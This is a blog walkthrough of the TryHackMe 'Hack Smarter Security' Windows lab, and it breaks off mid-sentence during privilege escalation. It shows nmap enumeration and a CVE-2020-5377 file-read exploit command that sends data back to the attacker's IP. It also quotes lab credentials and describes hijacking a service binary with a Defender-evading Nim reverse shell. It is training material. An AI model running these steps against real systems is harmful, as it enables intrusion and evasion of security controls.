<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>THM: Hack Smarter Security</title>
<meta name=description content="Platform: TryHackMe Link: Hack Smarter Security Level: Medium OS: Windows In this challenge we exploit a Windows Server machine feature SSH (which is not …"><meta name=keywords content="TryHackMe"><meta property="og:url" content="https://scorpiosec.com/posts/thm-hacksmartersecurity/"><meta property="og:type" content="website"><meta property="og:title" content="THM: Hack Smarter Security"><meta property="og:description" content="Platform: TryHackMe Link: Hack Smarter Security Level: Medium OS: Windows In this challenge we exploit a Windows Server machine feature SSH (which is not …"><meta property="og:image" content="https://scorpiosec.com/images/THM-HackSmarterSecurity/hack-smarter.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/THM-HackSmarterSecurity/hack-smarter.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="THM: Hack Smarter Security"><meta name=twitter:description content="Platform: TryHackMe Link: Hack Smarter Security Level: Medium OS: Windows In this challenge we exploit a Windows Server machine feature SSH (which is not …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/thm-hacksmartersecurity/"><meta property="twitter:url" content="https://scorpiosec.com/posts/thm-hacksmartersecurity/"><meta name=twitter:image content="https://scorpiosec.com/images/THM-HackSmarterSecurity/hack-smarter.png"><link rel=canonical href=https://scorpiosec.com/posts/thm-hacksmartersecurity/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/thm-hacksmartersecurity/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>THM: Hack Smarter Security</h1><small role=doc-subtitle></small><p class=post-date>7 min read |
<span class=post-date>March 22, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/tryhackme>TryHackMe</a></li></ul></div><div class=post-content><ul><li>Platform: TryHackMe</li><li>Link: <a href=https://tryhackme.com/r/room/hacksmartersecurity>Hack Smarter Security</a></li><li>Level: Medium</li><li>OS: Windows</li></ul><hr><p>In this challenge we exploit a Windows Server machine feature SSH (which is not usual). After exploiting an uncommon service we find ourselves having to bypass Windows Defender in order to achieve administrative privileges.</p><p>The target IP address is <code>10.10.189.226</code>.</p><h2 id=recon>Recon</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/Hack-Smarter-Security 10.10.189.226
</code></pre><p>Several ports are found to be opened:</p><ul><li>FTP is running on port 21, with anonymous login allowed</li><li>SSH on port 22, which can potentially be our way into the system if credentials are found</li><li>A Windows IIS server is running on port 80</li><li>From the nmap results it is not clear which service is running on port 1311</li><li>Windows WBT server is running on port 3389, this is used for Windows Remote Desktop and Remote Assistance connections</li></ul><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-03-18 18:27 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.160.34
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.24s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>995</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE       VERSION
</span></span><span style=display:flex><span>21/tcp   open  ftp           Microsoft ftpd
</span></span><span style=display:flex><span>| ftp-syst: 
</span></span><span style=display:flex><span>|_  SYST: Windows_NT
</span></span><span style=display:flex><span>| ftp-anon: Anonymous FTP login allowed <span style=color:#56b6c2>(</span>FTP code 230<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| 06-28-23  02:58PM                 <span style=color:#d19a66>3722</span> Credit-Cards-We-Pwned.txt
</span></span><span style=display:flex><span>|_06-28-23  03:00PM              <span style=color:#d19a66>1022126</span> stolen-passport.png
</span></span><span style=display:flex><span>22/tcp   open  ssh           OpenSSH for_Windows_7.7 <span style=color:#56b6c2>(</span>protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>2048</span> 0d:fa:da:de:c9:dd:99:8d:2e:8e:eb:3b:93:ff:e2:6c <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 5d:0c:df:32:26:d3:71:a2:8e:6e:9a:1c:43:fc:1a:03 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> c4:25:e7:09:d6:c9:d9:86:5f:6e:8a:8b:ec:13:4a:8b <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp   open  http          Microsoft IIS httpd 10.0
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style=display:flex><span>|_http-title: HackSmarterSec
</span></span><span style=display:flex><span>1311/tcp open  ssl/rxmon?
</span></span><span style=display:flex><span>| fingerprint-strings: 
</span></span><span style=display:flex><span>|   GetRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#d19a66>200</span> 
</span></span><span style=display:flex><span>|     Strict-Transport-Security: max-age<span style=color:#56b6c2>=</span><span style=color:#d19a66>0</span>
</span></span><span style=display:flex><span>|     X-Frame-Options: SAMEORIGIN
</span></span><span style=display:flex><span>|     X-Content-Type-Options: nosniff
</span></span><span style=display:flex><span>|     X-XSS-Protection: 1; <span style=color:#e06c75>mode</span><span style=color:#56b6c2>=</span>block
</span></span><span style=display:flex><span>|     vary: accept-encoding
</span></span><span style=display:flex><span>|     Content-Type: text/html;<span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span>UTF-8
</span></span><span style=display:flex><span>|     Date: Mon, <span style=color:#d19a66>18</span> Mar <span style=color:#d19a66>2024</span> 23:28:22 GMT
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     &lt;!DOCTYPE html PUBLIC <span style=color:#98c379>&#34;-//W3C//DTD XHTML 1.0 Strict//EN&#34;</span> <span style=color:#98c379>&#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;html&gt;
</span></span><span style=display:flex><span>|     &lt;head&gt;
</span></span><span style=display:flex><span>|     &lt;META http-equiv<span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;Content-Type&#34;</span> <span style=color:#e06c75>content</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/html; charset=UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;link <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/css&#34;</span> <span style=color:#e06c75>rel</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;stylesheet&#34;</span> <span style=color:#e06c75>href</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/oma/css/loginmaster.css&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;style <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/css&#34;</span>&gt;&lt;/style&gt;
</span></span><span style=display:flex><span>|     &lt;script <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/javascript&#34;</span> <span style=color:#e06c75>src</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/oma/js/prototype.js&#34;</span> <span style=color:#e06c75>language</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/javascript&#34;</span> <span style=color:#e06c75>src</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/oma/js/gnavbar.js&#34;</span> <span style=color:#e06c75>language</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/javascript&#34;</span> <span style=color:#e06c75>src</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/oma/js/Clarity.js&#34;</span> <span style=color:#e06c75>language</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script <span style=color:#e06c75>language</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;javascript&#34;</span>&gt;
</span></span><span style=display:flex><span>|   HTTPOptions: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#d19a66>200</span> 
</span></span><span style=display:flex><span>|     Strict-Transport-Security: max-age<span style=color:#56b6c2>=</span><span style=color:#d19a66>0</span>
</span></span><span style=display:flex><span>|     X-Frame-Options: SAMEORIGIN
</span></span><span style=display:flex><span>|     X-Content-Type-Options: nosniff
</span></span><span style=display:flex><span>|     X-XSS-Protection: 1; <span style=color:#e06c75>mode</span><span style=color:#56b6c2>=</span>block
</span></span><span style=display:flex><span>|     vary: accept-encoding
</span></span><span style=display:flex><span>|     Content-Type: text/html;<span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span>UTF-8
</span></span><span style=display:flex><span>|     Date: Mon, <span style=color:#d19a66>18</span> Mar <span style=color:#d19a66>2024</span> 23:28:29 GMT
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     &lt;!DOCTYPE html PUBLIC <span style=color:#98c379>&#34;-//W3C//DTD XHTML 1.0 Strict//EN&#34;</span> <span style=color:#98c379>&#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;html&gt;
</span></span><span style=display:flex><span>|     &lt;head&gt;
</span></span><span style=display:flex><span>|     &lt;META http-equiv<span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;Content-Type&#34;</span> <span style=color:#e06c75>content</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/html; charset=UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;link <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/css&#34;</span> <span style=color:#e06c75>rel</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;stylesheet&#34;</span> <span style=color:#e06c75>href</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/oma/css/loginmaster.css&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;style <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/css&#34;</span>&gt;&lt;/style&gt;
</span></span><span style=display:flex><span>|_    &lt;script <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/javascript&#34;</span> <span style=color:#e06c75>src</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/oma/js/prototype.js&#34;</span> <span style=color:#e06c75>language</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/javascript&#34;</span> <span style=color:#e06c75>src</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/oma/js/gnavbar.js&#34;</span> <span style=color:#e06c75>language</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script <span style=color:#e06c75>type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/javascript&#34;</span> <span style=color:#e06c75>src</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/oma/js/Clarity.js&#34;</span> <span style=color:#e06c75>language</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;javascript&#34;</span>&gt;&lt;/script&gt;&lt;script <span style=color:#e06c75>language</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;javascript&#34;</span>&gt;
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>hacksmartersec/organizationName<span style=color:#56b6c2>=</span>Dell Inc/stateOrProvinceName<span style=color:#56b6c2>=</span>TX/countryName<span style=color:#56b6c2>=</span>US
</span></span><span style=display:flex><span>| Not valid before: 2023-06-30T19:03:17
</span></span><span style=display:flex><span>|_Not valid after:  2025-06-29T19:03:17
</span></span><span style=display:flex><span>3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span style=display:flex><span>|_ssl-date: 2024-03-18T23:29:06+00:00; +2s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>hacksmartersec
</span></span><span style=display:flex><span>| Not valid before: 2024-03-17T23:23:26
</span></span><span style=display:flex><span>|_Not valid after:  2024-09-16T23:23:26
</span></span><span style=display:flex><span>| rdp-ntlm-info: 
</span></span><span style=display:flex><span>|   Target_Name: HACKSMARTERSEC
</span></span><span style=display:flex><span>|   NetBIOS_Domain_Name: HACKSMARTERSEC
</span></span><span style=display:flex><span>|   NetBIOS_Computer_Name: HACKSMARTERSEC
</span></span><span style=display:flex><span>|   DNS_Domain_Name: hacksmartersec
</span></span><span style=display:flex><span>|   DNS_Computer_Name: hacksmartersec
</span></span><span style=display:flex><span>|   Product_Version: 10.0.17763
</span></span><span style=display:flex><span>|_  System_Time: 2024-03-18T23:29:00+00:00
</span></span><span style=display:flex><span><span style=color:#d19a66>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style=display:flex><span>SF-Port1311-TCP:V<span style=color:#56b6c2>=</span>7.94SVN%T<span style=color:#56b6c2>=</span>SSL%I<span style=color:#56b6c2>=</span>7%D<span style=color:#56b6c2>=</span>3/18%Time<span style=color:#56b6c2>=</span>65F8CE13%P<span style=color:#56b6c2>=</span>x86_64-pc-linux
</span></span><span style=display:flex><span>SF:-gnu%r<span style=color:#56b6c2>(</span>GetRequest,1089,<span style=color:#98c379>&#34;HTTP/1\.1\x20200\x20\r\nStrict-Transport-Securi
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:ty:\x20max-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Op
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:tions:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:accept-encoding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0Mon,\x2018\x20Mar\x202024\x2023:28:22\x20GMT\r\nConnection:\x20close\r
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\n\r\n&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&#34;-//W3C//DTD\x20XHTML\x201\.0\x20
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:Strict//EN\&#34;\x20\&#34;http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:&#34;</span>&gt;<span style=color:#98c379>\r\n</span>&lt;html&gt;<span style=color:#98c379>\r\n</span>&lt;head&gt;<span style=color:#98c379>\r\n</span>&lt;META<span style=color:#98c379>\x</span>20http-equiv<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>Content-Type<span style=color:#98c379>\&#34;\x</span>20conte
</span></span><span style=display:flex><span>SF:nt<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>text/html;<span style=color:#98c379>\x</span>20charset<span style=color:#56b6c2>=</span>UTF-8<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\r\n</span>&lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;
</span></span><span style=display:flex><span>SF:<span style=color:#98c379>\r\n</span>&lt;link<span style=color:#98c379>\x</span>20type<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>text/css<span style=color:#98c379>\&#34;\x</span>20rel<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>stylesheet<span style=color:#98c379>\&#34;\x</span>20href<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>/oma/css
</span></span><span style=display:flex><span>SF:/loginmaster<span style=color:#98c379>\.</span>css<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\r\n</span>&lt;style<span style=color:#98c379>\x</span>20type<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>text/css<span style=color:#98c379>\&#34;</span>&gt;&lt;/style&gt;<span style=color:#98c379>\r\n</span>&lt;script
</span></span><span style=display:flex><span>SF:<span style=color:#98c379>\x</span>20type<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>text/javascript<span style=color:#98c379>\&#34;\x</span>20src<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>/oma/js/prototype<span style=color:#98c379>\.</span>js<span style=color:#98c379>\&#34;\x</span>20langua
</span></span><span style=display:flex><span>SF:ge<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>javascript<span style=color:#98c379>\&#34;</span>&gt;&lt;/script&gt;&lt;script<span style=color:#98c379>\x</span>20type<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>text/javascript<span style=color:#98c379>\&#34;\x</span>20src<span style=color:#56b6c2>=</span><span style=color:#98c379>\
</span></span></span><span style=display:flex><span><span style=color:#98c379></span>SF:<span style=color:#98c379>&#34;/oma/js/gnavbar\.js\&#34;\x20language=\&#34;javascript\&#34;&gt;&lt;/script&gt;&lt;script\x20t
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:ype=\&#34;text/javascript\&#34;\x20src=\&#34;/oma/js/Clarity\.js\&#34;\x20language=\&#34;ja
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:vascript\&#34;&gt;&lt;/script&gt;&lt;script\x20language=\&#34;javascript\&#34;&gt;\r\n\x20&#34;</span><span style=color:#56b6c2>)</span>%r<span style=color:#56b6c2>(</span>HTT
</span></span><span style=display:flex><span>SF:POptions,1089,<span style=color:#98c379>&#34;HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:\x20ma
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:x-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Options:\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20accept-en
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:coding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Mon,\x20
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:18\x20Mar\x202024\x2023:28:29\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!D
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:OCTYPE\x20html\x20PUBLIC\x20\&#34;-//W3C//DTD\x20XHTML\x201\.0\x20Strict//E
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:N\&#34;\x20\&#34;http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\&#34;&gt;\r\n&lt;ht
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:ml&gt;\r\n&lt;head&gt;\r\n&lt;META\x20http-equiv=\&#34;Content-Type\&#34;\x20content=\&#34;text
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:/html;\x20charset=UTF-8\&#34;&gt;\r\n&lt;title&gt;OpenManage&amp;trade;&lt;/title&gt;\r\n&lt;link
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x20type=\&#34;text/css\&#34;\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;/oma/css/loginmas
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:ter\.css\&#34;&gt;\r\n&lt;style\x20type=\&#34;text/css\&#34;&gt;&lt;/style&gt;\r\n&lt;script\x20type=
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\&#34;text/javascript\&#34;\x20src=\&#34;/oma/js/prototype\.js\&#34;\x20language=\&#34;java
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:script\&#34;&gt;&lt;/script&gt;&lt;script\x20type=\&#34;text/javascript\&#34;\x20src=\&#34;/oma/js/
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:gnavbar\.js\&#34;\x20language=\&#34;javascript\&#34;&gt;&lt;/script&gt;&lt;script\x20type=\&#34;tex
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:t/javascript\&#34;\x20src=\&#34;/oma/js/Clarity\.js\&#34;\x20language=\&#34;javascript\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:&#34;</span>&gt;&lt;/script&gt;&lt;script<span style=color:#98c379>\x</span>20language<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>javascript<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\r\n\x</span>20<span style=color:#98c379>&#34;);
</span></span></span><span style=display:flex><span><span style=color:#98c379>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span style=display:flex><span><span style=color:#98c379>
</span></span></span><span style=display:flex><span><span style=color:#98c379>Host script results:
</span></span></span><span style=display:flex><span><span style=color:#98c379>|_clock-skew: mean: 2s, deviation: 0s, median: 1s
</span></span></span><span style=display:flex><span><span style=color:#98c379>
</span></span></span><span style=display:flex><span><span style=color:#98c379>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span style=display:flex><span><span style=color:#98c379>Nmap done: 1 IP address (1 host up) scanned in 80.56 seconds
</span></span></span></code></pre></div><h2 id=enumeration>Enumeration</h2><p>The nmap scan reveals that the FTP servers allows for anonymous login. After accessing the server we find two files <code>Credit-Cards-We-Pwned.txt</code> and <code>stolen-passport.png</code>.</p><p><img src=/images/THM-HackSmarterSecurity/ftp-server.png alt="FTP files"></p><p>The file <code>Credit-Cards-We-Pwned.txt</code> contains a list of credit cards information, which are definitely fake since this is a hacking challenge.</p><p><img src=/images/THM-HackSmarterSecurity/fake-credit-cards.png alt="Fake credit cards numbers"></p><p>The <code>stolen-passport.png</code> file fails to download because of the ASCII mode on the FTP server, images are often stored in binary format.</p><p><img src=/images/THM-HackSmarterSecurity/passport-img.png alt="Password image transfer fails"></p><p>After switching to binary mode with <code>binary</code> the transfer is successful.</p><p><img src=/images/THM-HackSmarterSecurity/passport-img2.png alt="Password image transfer success"></p><p>Nothing of value is gained after running <code>strings</code> and <code>exiftool</code> on the file. This ends up being a rabbit hole leading to nothing exploitable.</p><p><img src=/images/THM-HackSmarterSecurity/passport-img3.png alt="Picture of the eye of the room author"></p><p>After visiting the website nothing of interest is found, it a static website without any working functionalities.</p><p><img src=/images/THM-HackSmarterSecurity/hackers-website.png alt="Hackers website"></p><p>Directory and subdomain enumeration with <code>gobuster</code> is also unfruitful.</p><p>Trying to access the service on port <code>1311</code> with <code>http://10.10.189.226:1311/</code> produces an error.</p><p><img src=/images/THM-HackSmarterSecurity/port1311-error.png alt="port 1311 error"></p><p>This can be solved by using <code>https</code> instead. We get a page running <code>Dell EMC OpenManage</code> login page.</p><p><img src=/images/THM-HackSmarterSecurity/dell-openmanage.png alt="Dell OpenManage service"></p><p>Attempting to bypass the login page via the exploit found in this <a href=https://www.tenable.com/security/research/tra-2021-07>Tenable blog post</a> is unsuccessful.</p><p>After clicking on <code>About</code> we discover the software is running version <code>9.4.0.2</code>.</p><p><img src=/images/THM-HackSmarterSecurity/Dell-OMACS-version.png alt="Dell OMACS version"></p><p>Looking for exploits we find <a href=https://rhinosecuritylabs.com/research/cve-2020-5377-dell-openmanage-server-administrator-file-read/>CVE-2020-5377</a>, this is a file read vulnerability in <code>Dell OpenManage Server Administrator</code>and a PoC is found <a href=https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2020-5377_CVE-2021-21514>here</a>.</p><p>Following the usage instructions we attempt to exploit the target</p><pre tabindex=0><code>python3 Dell-xploit.py 10.2.104.130 10.10.189.226:1311
</code></pre><p><img src=/images/THM-HackSmarterSecurity/Dell-exploit.png alt="Dell file read exploit"></p><p>We are able to read the files on the server. From the nmap scan we know that the target is running <code>Microsoft IIS</code> on port 80.</p><ul><li>The root folder for IIS is located at <code>C:\inetpub\wwwroot</code></li><li>In the scan results we find <code>commonName=hacksmartersec</code> under port 1311</li><li>We know the <code>web.config</code> file must be present at the content root path of the deployed application. You can read more about it <a href="https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-8.0">here</a></li></ul><p>Applying all the information we have, credentials for the user <code>tyler</code> are found at <code>C:\inetpub\wwwroot\hacksmartersec\web.config</code>.</p><p><img src=/images/THM-HackSmarterSecurity/creds.png alt="Tyler SSH credentials found"></p><h2 id=foothold>Foothold</h2><p>Using <code>tyler:IAmA1337h4x0randIkn0wit!</code> we are able to login via SSH.</p><p><img src=/images/THM-HackSmarterSecurity/ssh-access.png alt="SSH access with user tyler credentials"></p><h3 id=what-is-usertxt>What is user.txt?</h3><p>The user flag <code>user.txt</code> is then accessible at <code>C:\Users\tyler\Desktop\user.txt</code>.</p><p><img src=/images/THM-HackSmarterSecurity/user-flag.png alt="User flag"></p><h2 id=privilege-escalation>Privilege Escalation</h2><h3 id=creating-a-new-admin-account>Creating a new admin account</h3><p>We now need to find some privilege escalation paths. Attempting to use <code>winPEAS</code> for system enumeration fails, it gets flagged and stopped by Microsoft Defender.</p><p><img src=/images/THM-HackSmarterSecurity/winpeas-fail.png alt="winPEAS fails because of Windows Defender"></p><p><a href=https://github.com/itm4n/PrivescCheck/tree/master>PrivescCheck</a> works without being blocked by Defender.</p><p><img src=/images/THM-HackSmarterSecurity/privesccheck.png alt="PrivescCheck works despite Microsoft Defender"></p><p>A few non-default services are found.</p><p><img src=/images/THM-HackSmarterSecurity/non-default-services.png alt="A few non-default services are discovered"></p><p>In the <code>Services binary permissions</code> section we find a vulnerable service called <code>spoofer-scheduler</code>. We can potentially replace <code>spoofer-scheduler.exe</code> with a malicious file of the same name to escalate our privileges since the user <code>tyler</code> has all the necessary permissions.</p><p><img src=/images/THM-HackSmarterSecurity/vulnerable-service.png alt="Vulnerable service found"></p><p>We have to keep in mind that Windows Defender is active, so if the reverse shell isn&rsquo;t stealthy enough it will get flagged. We do have a few different ways to achieve our goals.</p><p>A reverse shell written in Nim that bypasses Windows Defender is available <a href=https://github.com/Sn1r/Nim-Reverse-Shell>here</a>.</p><p>We stop the service with <code>Stop-Service -Name "spoofer-scheduler"</code> and we remove the executable with <code>rm spoofer-scheduler.exe</code>.</p><blockquote><p>Don&rsquo;t forget to compile the reverse shell with <code>nim c -d:mingw --app:gui rev_shell.nim</code>.</p></blockquote><p>The Nim reverse shell is sent to the target after compilation.</p><p><img src=/images/THM-HackSmarterSecurity/malicious-exe.png alt="Malicious executable file on the target"></p><p>After restarting the service with <code>Start-Service -Name "spoofer-scheduler"</code> we get a reverse shell running a privileged 